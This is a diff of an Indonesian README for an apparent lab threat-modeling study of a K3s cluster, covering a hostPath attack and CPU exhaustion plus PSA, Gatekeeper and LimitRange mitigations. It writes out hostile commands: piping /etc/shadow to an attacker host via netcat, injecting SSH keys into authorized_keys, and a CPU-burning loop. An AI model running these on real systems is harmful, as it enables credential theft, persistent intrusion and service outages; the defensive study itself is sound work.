@@ -1,160 +1,167 @@
 # Analisis Threat Modeling STRIDE pada Infrastruktur Kubernetes
 
-Repositori ini berisi hasil analisis dan simulasi keamanan pada cluster Kubernetes (K3s) menggunakan metodologi **STRIDE** (*Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege*). Penelitian ini berfokus pada dua skenario serangan utama—**HostPath Attack** dan **CPU Resource Exhaustion**—serta langkah-langkah mitigasinya.
+Repositori ini berisi hasil analisis dan simulasi keamanan pada cluster Kubernetes (K3s) menggunakan metodologi **STRIDE** (*Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege*)[cite: 1]. Penelitian ini berfokus pada dua skenario serangan utama—**HostPath Attack** dan **CPU Resource Exhaustion**—serta langkah-langkah mitigasinya[cite: 1].
 
 ---
 
 ## Arsitektur Target & Aset Kritis
 
 ### 1. Spesifikasi Cluster K3s
-* **Control Plane**: Ubuntu Server (`v1.35.5+k3s1`)
-* **Worker Node**: Kali Linux (`v1.35.5+k3s1`)
-* **Aplikasi Target**: OWASP Juice Shop
+* **Control Plane**: Ubuntu Server (`ubuntu`, Ready, `v1.35.5+k3s1`)[cite: 1]
+* **Worker Node**: Kali Linux (`kali`, Ready, `v1.35.5+k3s1`)[cite: 1]
+* **Aplikasi Target**: OWASP Juice Shop (diakses via NodePort `http://100.96.138.59:31423`)[cite: 1]
 
 ### 2. Aset yang Dilindungi
-* File kredensial sistem host (`/etc/shadow`, `/etc/passwd`)
-* Akses remote SSH (`~/.ssh/authorized_keys`)
-* Sumber daya komputasi node (CPU & Memori)
-* Layanan web OWASP Juice Shop
-* Catatan aktivitas sistem (*System & Audit Logs*)
+* File kredensial sistem host (`/etc/shadow`, `/etc/passwd`)[cite: 1]
+* Akses remote SSH (`~/.ssh/authorized_keys`)[cite: 1]
+* Sumber daya komputasi node (CPU & Memori)[cite: 1]
+* Layanan web OWASP Juice Shop[cite: 1]
+* Catatan aktivitas sistem (*System & Audit Logs*)[cite: 1]
 
 ---
 
 ## Skenario 1: HostPath Attack
-Ancaman: *Information Disclosure*, *Tampering*, dan *Elevation of Privilege*
+Ancaman: *Information Disclosure*, *Tampering*, dan *Elevation of Privilege*[cite: 1]
 
-Pada skenario ini, pod jahat dikonfigurasi menggunakan volume `hostPath` yang mengarah langsung ke direktori sensitif host (`/etc`, `/var`, `/home`).
+Pada skenario ini, pod jahat (`skenariol`) dikonfigurasi di namespace `security-audit-lab` menggunakan volume `hostPath` yang mengarah langsung ke direktori sensitif host (`/etc`, `/var`, `/home`)[cite: 1].
 
 ### Alur Serangan (Data Flow Diagram)
-<img width="1118" height="557" alt="image" src="https://github.com/user-attachments/assets/01514363-a5d5-4942-b7dc-c4141381cd6b" />
-Penjelasan gambar diatas: DFD menunjukkan alur penyerang membuat malicious pod yang melakukan mounting direktori host, membaca kredensial `/etc/shadow`, meng-eksfiltrasi data, menyisipkan public key ke file `authorized_keys` host, hingga mendapatkan akses persisten via SSH.
+<p align="center">
+  <img width="1118" height="557" alt="DFD Skenario 1" src="https://github.com/user-attachments/assets/01514363-a5d5-4942-b7dc-c4141381cd6b" />
+</p>
+<p>
+  <b>Penjelasan DFD:</b> Diagram Alur Data (DFD) menunjukkan alur di mana penyerang mendeploy pod jahat dengan mount direktori host, membaca file kredensial <code>/etc/shadow</code>, mengeksfiltrasi data via Netcat ke Kali Linux, menyisipkan public key SSH ke dalam <code>authorized_keys</code> milik user <code>ubuntu</code>, hingga memperoleh akses persisten langsung ke sistem host via SSH.
+</p>
 
 ### Tahapan Akses & Eksfiltrasi Data
 
 <p>
-  <img width="512" alt="image" src="https://github.com/user-attachments/assets/6522bf11-25f6-4ef9-a3d4-190725e24aa1" />
+  <img width="512" alt="Pod Manifest Skenario 1" src="https://github.com/user-attachments/assets/6522bf11-25f6-4ef9-a3d4-190725e24aa1" />
 </p>
 <p>
-  Penjelasan gambar diatas: Manifes YAML pod <code>skenario1</code> berbasis <code>alpine:latest</code> dengan mount <code>hostPath</code> ke direktori host <code>/etc</code>, <code>/var</code>, dan <code>/home</code>.
+  <b>Penjelasan gambar diatas:</b> Pembuatan namespace <code>security-audit-lab</code> dan penyiapan manifes pod <code>skenariol</code> berbasis <code>alpine:latest</code> dengan mount point <code>hostPath</code> yang mengarahkan <code>/etc</code> ke <code>/mnt/host-etc</code>, <code>/var</code> ke <code>/mnt/host-var</code>, dan <code>/home</code> ke <code>/mnt/host-home</code>.
 </p>
 
 <p>
-  <img width="512" alt="image" src="https://github.com/user-attachments/assets/8fc315fc-e656-4faf-8e66-443a85a7d326" />
+  <img width="512" alt="Akses File Sensitif" src="https://github.com/user-attachments/assets/8fc315fc-e656-4faf-8e66-443a85a7d326" />
 </p>
 <p>
-  Penjelasan gambar diatas: Penyerang menggunakan perintah <code>kubectl exec</code> untuk masuk ke shell pod dan membaca isi file sensitif <code>/etc/shadow</code> host.
+  <b>Penjelasan gambar diatas:</b> Penyerang mengeksekusi shell ke dalam pod menggunakan <code>kubectl exec -it skenariol -n security-audit-lab sh</code> dan mengakses isi file <code>/mnt/host-etc/shadow</code> untuk mengintip hash password akun sistem host.
 </p>
 
-![Gambar 4.4 - Pembukaan Port Listener](LINK_GAMBAR_DISINI)
-Penjelasan gambar diatas: Penyerang membuka listener jaringan dengan `nc -lvnp 4444` pada mesin Kali Linux untuk menerima data curian.
+![Pembukaan Port Listener Netcat](https://github.com/user-attachments/assets/LINK_GAMBAR_NETCAT_LISTENER)
+*Penjelasan gambar diatas:* Penyerang membuka listener jaringan dengan perintah `nc -tvnp 4444` pada mesin Kali Linux (`100.65.32.116`) untuk mendengarkan koneksi data masuk dari pod[cite: 1].
 
-![Gambar 4.5 - Hasil Eksfiltrasi Data Kredensial](LINK_GAMBAR_DISINI)
-Penjelasan gambar diatas: Data hash password dari file `/etc/shadow` berhasil dikirim dari pod ke mesin Kali Linux.
+![Hasil Eksfiltrasi Data Kredensial](https://github.com/user-attachments/assets/LINK_GAMBAR_EKSFILTRASI_SUCCESS)
+*Penjelasan gambar diatas:* Dari dalam pod di Ubuntu Server, penyerang mengirimkan data sensitif menggunakan perintah `cat /mnt/host-etc/shadow | nc 100.65.32.116 4444`, sehingga hash password sistem host berhasil dieksfiltrasi ke mesin penyerang[cite: 1].
 
 ### Tahapan Injeksi Kunci SSH & Akses Persisten
-![Gambar 4.6 - Generasi SSH Key Pair dan Status Jaringan](LINK_GAMBAR_DISINI)
-Penjelasan gambar diatas: Penyerang membuat sepasang kunci SSH baru (`exploit_key` & `exploit_key.pub`) menggunakan perintah `ssh-keygen`.
 
-![Gambar 4.7 - Injeksi Kunci Authorized_Keys](LINK_GAMBAR_DISINI)
-Penjelasan gambar diatas: Penyerang menyisipkan isi `exploit_key.pub` ke direktori `~/.ssh/authorized_keys` milik user host melalui mount point `/mnt/host-home`.
+![Generasi SSH Key Pair dan Status Jaringan](https://github.com/user-attachments/assets/LINK_GAMBAR_SSH_KEYGEN)
+*Penjelasan gambar diatas:* Penyerang membuat sepasang SSH key baru (`exploit_key` & `exploit_key.pub`) menggunakan `ssh-keygen -t rsa -b 4096` di mesin Kali Linux serta mengecek IP Tailscale target (`100.96.138.59`)[cite: 1].
 
-![Gambar 4.8 - Keberhasilan Login Pertama](LINK_GAMBAR_DISINI)
-Penjelasan gambar diatas: Penyerang berhasil melakukan login remote SSH langsung ke server host tanpa password.
+![Injeksi Kunci Authorized_Keys](https://github.com/user-attachments/assets/LINK_GAMBAR_SSH_INJECTION)
+*Penjelasan gambar diatas:* Melalui shell pod, penyerang membuat direktori `/mnt/host-home/ubuntu/.ssh/` dan menginjeksikan isi public key (`exploit_key.pub`) ke file `authorized_keys` dengan hak akses `600`[cite: 1].
 
-![Gambar 4.9 - Pembersihan Skenario dan Namespace](LINK_GAMBAR_DISINI)
-Penjelasan gambar diatas: Penyerang menghapus pod dan namespace `security-audit-lab` untuk menghilangkan jejak aktivitas di Kubernetes.
+![Keberhasilan Login SSH Pertama](https://github.com/user-attachments/assets/LINK_GAMBAR_SSH_LOGIN_SUCCESS)
+*Penjelasan gambar diatas:* Penyerang berhasil melakukan login remote SSH langsung ke mesin host Ubuntu menggunakan `ssh -i ~/.ssh/exploit_key ubuntu@100.96.138.59` tanpa memerlukan password[cite: 1].
 
-![Gambar 4.10 - Akses Persisten Pasca Penghapusan](LINK_GAMBAR_DISINI)
-Penjelasan gambar diatas: Penyerang terbukti masih bisa mengakses host via SSH meskipun pod dan namespace pendukung di Kubernetes sudah dihapus.
+![Pembersihan Skenario dan Namespace](https://github.com/user-attachments/assets/LINK_GAMBAR_DELETE_NAMESPACE)
+*Penjelasan gambar diatas:* Administrator/Penyerang menghapus namespace `security-audit-lab` (`sudo kubectl delete ns security-audit-lab`) untuk mencoba menghentikan eksploitasi dan membersihkan Pod[cite: 1].
+
+![Akses Persisten Pasca Penghapusan](https://github.com/user-attachments/assets/LINK_GAMBAR_PERSISTENT_ACCESS)
+*Penjelasan gambar diatas:* Meskipun pod dan namespace di Kubernetes telah dihapus seluruhnya, penyerang terbukti masih bisa login kembali via SSH ke host Ubuntu, membuktikan tercapainya akses persisten (*Elevation of Privilege & Persistence*)[cite: 1].
 
 ---
 
 ## Skenario 2: CPU Resource Exhaustion Attack
-Ancaman: *Denial of Service* (DoS) dan *Repudiation*
+Ancaman: *Denial of Service* (DoS) dan *Repudiation*[cite: 1]
 
-Skenario ini mensimulasikan pod jahat yang mengonsumsi seluruh daya komputasi CPU pada node karena tidak dilindungi oleh pembatasan kuota (*resource limit*).
+Skenario ini mensimulasikan pod jahat (`attacker-pod` / `cpu-killer`) di namespace `dos-lab` yang mengonsumsi seluruh daya komputasi CPU pada node karena tidak dibatasi oleh *resource limits*[cite: 1].
 
 ### Alur Serangan (Data Flow Diagram)
-![Gambar 4.11 - Data Flow Diagram Skenario CPU Exhaustion](LINK_GAMBAR_DISINI)
-Penjelasan gambar diatas: DFD menggambarkan alur serangan DoS. Pod jahat mengeksekusi proses pembakaran CPU yang membuat penggunaan CPU melonjak hingga 90%, mengganggu layanan aplikasi lain, serta menunjukkan celah repudiation akibat minimnya audit log.
+![Data Flow Diagram Skenario CPU Exhaustion](https://github.com/user-attachments/assets/LINK_GAMBAR_DFD_DOS)
+*Penjelasan gambar diatas:* DFD menggambarkan alur serangan DoS. Pod jahat mengeksekusi skrip pembakar CPU yang memicu lonjakan pemakaian CPU hingga 90%, berakibat pada pembengkakan waktu respon aplikasi OWASP Juice Shop, serta mengeksploitasi celah *Repudiation* akibat tidak adanya pencatatan audit log[cite: 1].
 
 ### Tahapan Serangan DoS
-![Gambar 4.12 - Pemicu Eksploitasi DoS](LINK_GAMBAR_DISINI)
-Penjelasan gambar diatas: File `attacker-pod.yaml` berisi skrip infinite loop `yes > /dev/null` tanpa batasan `resources.limits.cpu`.
 
-![Gambar 4.13 - Penerapan Pod DoS](LINK_GAMBAR_DISINI)
-Penjelasan gambar diatas: Eksekusi deployment pod pembakar CPU ke namespace `dos-lab`.
+![File Manifes attacker-pod.yaml](https://github.com/user-attachments/assets/LINK_GAMBAR_ATTACKER_POD_YAML)
+*Penjelasan gambar diatas:* File `attacker-pod.yaml` berisi konfigurasi pod dengan perintah shell infinite loop (`for i in 1 2 3 4; do (while true; do yes > /dev/null; done) & done;`) tanpa menyertakan batasan `resources.limits`[cite: 1].
 
-![Gambar 4.14 - Sebelum Pod diterapkan ke Namespace (CPU 2%)](LINK_GAMBAR_DISINI)
-Penjelasan gambar diatas: Perintah `kubectl top nodes` menunjukkan penggunaan CPU node secara normal berada pada tingkat 2%.
+![Penerapan Pod DoS ke Namespace](https://github.com/user-attachments/assets/LINK_GAMBAR_APPLY_CPU_BURNER)
+*Penjelasan gambar diatas:* Eksekusi perintah `sudo kubectl apply -f cpu-burner.yaml` untuk mendeploy pod pembakar CPU ke namespace `dos-lab`[cite: 1].
 
-![Gambar 4.15 - Setelah Pod diterapkan ke Namespace (CPU dari 2% menjadi 90%)](LINK_GAMBAR_DISINI)
-Penjelasan gambar diatas: Penggunaan CPU Control Plane melonjak drastis hingga 90% setelah pod DoS berjalan.
+![Sebelum Pod diterapkan ke Namespace (CPU 2%)](https://github.com/user-attachments/assets/LINK_GAMBAR_CPU_BEFORE)
+*Penjelasan gambar diatas:* Hasil perintah `kubectl top nodes` sebelum serangan menunjukkan konsumsi CPU pada node `ubuntu` dalam kondisi normal di kisaran 2% (`49m`)[cite: 1].
 
-![Gambar 4.16 - Visualisasi Dampak Layanan Website](LINK_GAMBAR_DISINI)
-Penjelasan gambar diatas: Aplikasi web OWASP Juice Shop mengalami penundaan akses yang signifikan (response time hingga ~139 detik).
+![Setelah Pod diterapkan ke Namespace (CPU dari 2% menjadi 90%)](https://github.com/user-attachments/assets/LINK_GAMBAR_CPU_AFTER)
+*Penjelasan gambar diatas:* Setelah pod berjalan, konsumsi CPU Control Plane (`ubuntu`) melonjak drastis hingga 90% (`1802m`)[cite: 1].
+
+![Visualisasi Dampak Layanan Website](https://github.com/user-attachments/assets/LINK_GAMBAR_JUICE_SHOP_SLOW)
+*Penjelasan gambar diatas:* Pengujian dengan `time curl -o /dev/null -s http://100.96.138.59:31423` menunjukkan bahwa website aplikasi OWASP Juice Shop mengalami degradasi berat dengan respon time membengkak hingga **139.28 detik**[cite: 1].
 
 ### Investigasi Repudiation (Ancaman Akuntabilitas)
-![Gambar 4.17 - Tidak ada keunikan pada ServiceAccount](LINK_GAMBAR_DISINI)
-Penjelasan gambar diatas: Pod DoS menggunakan `ServiceAccount: default`, sehingga pembuat pod tidak dapat dipastikan.
 
-![Gambar 4.18 - Tidak ada Label Identitas pada Pod](LINK_GAMBAR_DISINI)
-Penjelasan gambar diatas: Pod DoS tidak memiliki label identitas pengenal seperti `created-by`.
+![Tidak ada keunikan pada ServiceAccount](https://github.com/user-attachments/assets/LINK_GAMBAR_SA_DEFAULT)
+*Penjelasan gambar diatas:* Pemeriksaan `kubectl get pod attacker-pod -o yaml | grep serviceAccount` menunjukkan pod berjalan menggunakan `serviceAccount: default`, sehingga identitas spesifik pembuat tidak diketahui[cite: 1].
 
-![Gambar 4.19 - Kegagalan Pelacakan Log Audit](LINK_GAMBAR_DISINI)
-Penjelasan gambar diatas: Pemeriksaan `journalctl` tidak menampilkan jejak pembuatan pod karena fitur audit logging K3s dalam kondisi non-aktif.
+![Tidak ada Label Identitas pada Pod](https://github.com/user-attachments/assets/LINK_GAMBAR_NO_LABELS)
+*Penjelasan gambar diatas:* Perintah `kubectl get pod attacker-pod --show-labels` menampilkan `LABELS <none>`, membuktikan tidak adanya metadata pelacak seperti `created-by`[cite: 1].
+
+![Kegagalan Pelacakan Log Audit](https://github.com/user-attachments/assets/LINK_GAMBAR_AUDIT_LOG_EMPTY)
+*Penjelasan gambar diatas:* Pemeriksaan log K3s via `sudo journalctl -u k3s | grep "attacker-pod"` tidak menghasilkan catatan pembuat `kubectl apply`, mengonfirmasi bahwa audit logging dalam kondisi non-aktif[cite: 1].
 
 ---
 
 ## Implementasi Mitigasi
 
 ### 1. Pod Security Admission (PSA)
-PSA digunakan untuk menegakkan standar keamanan pod pada tingkat namespace.
+PSA digunakan untuk menegakkan standar keamanan pod bawaan Kubernetes pada tingkat namespace[cite: 1].
 
-![Gambar 4.20 - Aktivasi Penegakan Labeling PSA](LINK_GAMBAR_DISINI)
-Penjelasan gambar diatas: Pemberian label `pod-security.kubernetes.io/enforce=baseline` pada namespace target.
+![Aktivasi Penegakan Labeling PSA](https://github.com/user-attachments/assets/LINK_GAMBAR_PSA_LABELING)
+*Penjelasan gambar diatas:* Menerapkan label `pod-security.kubernetes.io/enforce=baseline` pada namespace target (`security-audit-lab-example`)[cite: 1].
 
-![Gambar 4.21 - Verifikasi Label PSA pada Namespace](LINK_GAMBAR_DISINI)
-Penjelasan gambar diatas: Verifikasi daftar namespace yang mengonfirmasi bahwa label baseline telah terpasang.
+![Verifikasi Label PSA pada Namespace](https://github.com/user-attachments/assets/LINK_GAMBAR_PSA_VERIFY)
+*Penjelasan gambar diatas:* Menjalankan `kubectl get ns --show-labels` untuk memastikan namespace target telah memiliki label kebijakan penegakan `baseline`[cite: 1].
 
-![Gambar 4.22 - Manifes Pengujian pada Namespace Terproteksi](LINK_GAMBAR_DISINI)
-Penjelasan gambar diatas: PSA berhasil menolak (*forbidden*) deployment pod yang mencoba menggunakan volume `hostPath`.
+![Manifes Pengujian pada Namespace Terproteksi](https://github.com/user-attachments/assets/LINK_GAMBAR_PSA_BLOCKING)
+*Penjelasan gambar diatas:* Saat pod `skenariol` yang menggunakan volume `hostPath` dideploy, PSA secara otomatis menolak (*Forbidden*) pembuatan pod karena melanggar aturan keamanan baseline[cite: 1].
 
 ### 2. Open Policy Agent (OPA) Gatekeeper
-Gatekeeper memberikan kontrol *Policy as Code* berbasis bahasa Rego untuk memblokir penggunaan `hostPath`.
+Gatekeeper memberikan kontrol *Policy as Code* berbasis bahasa Rego untuk memblokir penggunaan `hostPath` secara kustom[cite: 1].
 
-![Gambar 4.23 - Verifikasi Komponen Pods Gatekeeper](LINK_GAMBAR_DISINI)
-Penjelasan gambar diatas: Status pod sistem Gatekeeper di namespace `gatekeeper-system` berjalan normal.
+![Verifikasi Komponen Pods Gatekeeper](https://github.com/user-attachments/assets/LINK_GAMBAR_GATEKEEPER_PODS)
+*Penjelasan gambar diatas:* Verifikasi keberhasilan instalasi OPA Gatekeeper di namespace `gatekeeper-system` dengan status pod `audit` dan `controller-manager` berjalan `Running`[cite: 1].
 
-![Gambar 4.24 - Membuat File ConstraintTemplate](LINK_GAMBAR_DISINI)
-Penjelasan gambar diatas: Konfigurasi Rego pada `template-hostpath.yaml` yang mendeteksi penggunaan volume `hostPath`.
+![Membuat File ConstraintTemplate](https://github.com/user-attachments/assets/LINK_GAMBAR_TEMPLATE_HOSTPATH)
+*Penjelasan gambar diatas:* Pembuatan file `template-hostpath.yaml` yang berisi aturan logika Rego `K8sBanHostPath` untuk mendeteksi keberadaan `volume.hostPath`[cite: 1].
 
-![Gambar 4.25 - Menerapkan aturan ke cluster](LINK_GAMBAR_DISINI)
-Penjelasan gambar diatas: Menerapkan `ConstraintTemplate` ke dalam cluster.
+![Menerapkan aturan ConstraintTemplate ke cluster](https://github.com/user-attachments/assets/LINK_GAMBAR_APPLY_TEMPLATE)
+*Penjelasan gambar diatas:* Menerapkan file `template-hostpath.yaml` menggunakan `kubectl apply -f template-hostpath.yaml` hingga objek `constrainttemplate` berhasil dibuat[cite: 1].
 
-![Gambar 4.26 - Membuat File Constraint](LINK_GAMBAR_DISINI)
-Penjelasan gambar diatas: Konfigurasi `constraint-hostpath.yaml` yang menentukan objek mana saja yang wajib diperiksa.
+![Membuat File Constraint](https://github.com/user-attachments/assets/LINK_GAMBAR_CONSTRAINT_HOSTPATH)
+*Penjelasan gambar diatas:* Pembuatan file `constraint-hostpath.yaml` jenis `K8sBanHostPath` bernama `no-hostpath-volumes` yang menyasar objek `Pod`, `Deployment`, `DaemonSet`, dan `StatefulSet` (mengecualikan `kube-system` dan `gatekeeper-system`)[cite: 1].
 
-![Gambar 4.27 - Penerapan File Constraint ke cluster](LINK_GAMBAR_DISINI)
-Penjelasan gambar diatas: Menerapkan aturan `no-hostpath-volumes` ke dalam cluster.
+![Penerapan File Constraint ke cluster](https://github.com/user-attachments/assets/LINK_GAMBAR_APPLY_CONSTRAINT)
+*Penjelasan gambar diatas:* Menerapkan aturan constraint ke cluster menggunakan `kubectl apply -f constraint-hostpath.yaml`[cite: 1].
 
-![Gambar 4.28 - Validasi Kebijakan Pemblokiran HostPath](LINK_GAMBAR_DISINI)
-Penjelasan gambar diatas: Pengujian ulang pengiriman manifes pod `hostPath`.
+![Validasi Kebijakan Pemblokiran HostPath](https://github.com/user-attachments/assets/LINK_GAMBAR_TEST_GATEKEEPER)
+*Penjelasan gambar diatas:* Melakukan pengujian ulang dengan mengirimkan periferal manifes pod yang mengandung volume `hostPath` (`/etc`, `/var`, `/home`)[cite: 1].
 
-![Gambar 4.29 - Blocking Webhook Gatekeeper](LINK_GAMBAR_DISINI)
-Penjelasan gambar diatas: Webhook Gatekeeper berhasil memblokir secara langsung pod yang mencoba mengakses direktori `/etc`, `/var`, dan `/home`.
+![Blocking Webhook Gatekeeper](https://github.com/user-attachments/assets/LINK_GAMBAR_GATEKEEPER_DENIED)
+*Penjelasan gambar diatas:* Admission Webhook Gatekeeper (`validation.gatekeeper.sh`) berhasil mencegat dan menolak pembuatan pod secara langsung karena melanggar aturan `no-hostpath-volumes`[cite: 1].
 
 ### 3. LimitRange (Mitigasi CPU Exhaustion)
-LimitRange membatasi penggunaan maksimal sumber daya CPU dan memori per kontainer pada suatu namespace.
+LimitRange membatasi penggunaan konsumsi sumber daya CPU dan memori per kontainer secara otomatis pada suatu namespace[cite: 1].
 
-![Gambar 4.30 - Struktur Kebijakan Kontrol Sumber Daya (LimitRange)](LINK_GAMBAR_DISINI)
-Penjelasan gambar diatas: File `limitrange.yaml` menetapkan batas atas CPU sebesar `500m` (0.5 core) dan memori `256Mi`.
+![Struktur Kebijakan Kontrol Sumber Daya (LimitRange)](https://github.com/user-attachments/assets/LINK_GAMBAR_LIMITRANGE_YAML)
+*Penjelasan gambar diatas:* Pembuatan konfigurasi `LimitRange` (`dos-lab-limit`) pada namespace `dos-lab` yang menetapkan default limit CPU `500m`, memori `256Mi`, serta batas maksimal CPU `1 Core`[cite: 1].
 
-![Gambar 4.31 - Annotations pada Pod Menunjukkan Intervensi LimitRange](LINK_GAMBAR_DISINI)
-Penjelasan gambar diatas: Tampilan `kubectl describe pod` yang menunjukkan intervensi otomatis dari plugin `LimitRanger` menyuntikkan batasan sumber daya pada pod.
+![Annotations pada Pod Menunjukkan Intervensi LimitRange](https://github.com/user-attachments/assets/LINK_GAMBAR_LIMITRANGE_DESCRIBE)
+*Penjelasan gambar diatas:* Tampilan `kubectl describe pod` yang mengonfirmasi adanya anotasi `kubernetes.io/Limit-ranger` di mana plugin LimitRange secara otomatis menyuntikkan batasan CPU `500m` dan Memory `256Mi` pada pod jahat[cite: 1].
 
-![Gambar 4.32 - Stabilisasi Pasca Mitigasi (CPU turun menjadi 16%)](LINK_GAMBAR_DISINI)
-Penjelasan gambar diatas: Penggunaan CPU Control Plane berhasil diturunkan secara drastis dari 90% menjadi 16%, menjaga ketersediaan layanan cluster.
+![Stabilisasi Pasca Mitigasi (CPU turun menjadi 16%)](https://github.com/user-attachments/assets/LINK_GAMBAR_CPU_STABLE)
+*Penjelasan gambar diatas:* Setelah mitigasi diterapkan, konsumsi CPU node Control Plane (`ubuntu`) berhasil diturunkan drastis dari 90% menjadi **16% (`338m`)**, sehingga ketersediaan cluster dan layanan web tetap terjaga[cite: 1].
 
 ---
 
@@ -162,16 +169,16 @@ Penjelasan gambar diatas: Penggunaan CPU Control Plane berhasil diturunkan secar
 
 | Kategori STRIDE | Ancaman yang Ditemukan | Skenario | Tingkat Keparahan (*Severity*) |
 |---|---|---|---|
-| **Spoofing** | Penyerang menyamar sebagai user `ubuntu` via SSH Key | Skenario 1 | Low |
-| **Tampering** | Modifikasi file host (`authorized_keys`) | Skenario 1 | High |
-| **Repudiation** | Pelaku tidak teridentifikasi karena audit log mati | Skenario 2 | Medium |
-| **Information Disclosure** | Membaca & mengeksfiltrasi file `/etc/shadow` | Skenario 1 | High |
-| **Denial of Service** | Lonjakan CPU hingga 90% memicu kelumpuhan layanan | Skenario 2 | High |
-| **Elevation of Privilege** | Remote shell SSH persisten ke host luar | Skenario 1 | Critical |
+| **Spoofing** | Penyerang menyamar sebagai user `ubuntu` via SSH Key yang disisipkan | Skenario 1 | Low |
+| **Tampering** | Modifikasi file host (`authorized_keys`) via mount point `hostPath` | Skenario 1 | High |
+| **Repudiation** | Pelaku tidak teridentifikasi karena ServiceAccount default, tanpa label, dan audit log mati | Skenario 2 | Medium |
+| **Information Disclosure** | Membaca & mengeksfiltrasi isi file sensitif `/etc/shadow` ke mesin penyerang | Skenario 1 | High |
+| **Denial of Service** | Lonjakan CPU hingga 90% memicu kelumpuhan & kelemotan layanan OWASP Juice Shop | Skenario 2 | High |
+| **Elevation of Privilege** | Memperoleh shell SSH persisten ke sistem host eksternal meski Pod dihapus | Skenario 1 | Critical |
 
 ---
 
 ## Kesimpulan Mitigasi
-1. **PSA Baseline**: Efektif menolak pod dengan `hostPath` sebelum dijalankan.
-2. **OPA Gatekeeper**: Memberikan kontrol kebijakan kustom yang lebih terperinci untuk mencegah akses sistem file host.
-3. **LimitRange**: Efektif menstabilkan penggunaan CPU dari 90% menjadi 16%, mencegah timbulnya *Resource Starvation* dan gangguan ketersediaan (*Denial of Service*).
+1. **PSA Baseline**: Efektif menolak pembuatan pod yang menggunakan volume `hostPath` sebelum kontainer sempat dijalankan[cite: 1].
+2. **OPA Gatekeeper**: Memberikan kontrol kebijakan kustom (*Policy as Code*) berbasis Rego yang presisi untuk mencegah akses tidak sah ke direktori sistem host[cite: 1].
+3. **LimitRange**: Efektif menstabilkan penggunaan CPU dari 90% kembali ke 16%, membatasi potensi *Resource Exhaustion* serta menjamin ketersediaan (*Availability*) layanan cluster[cite: 1].
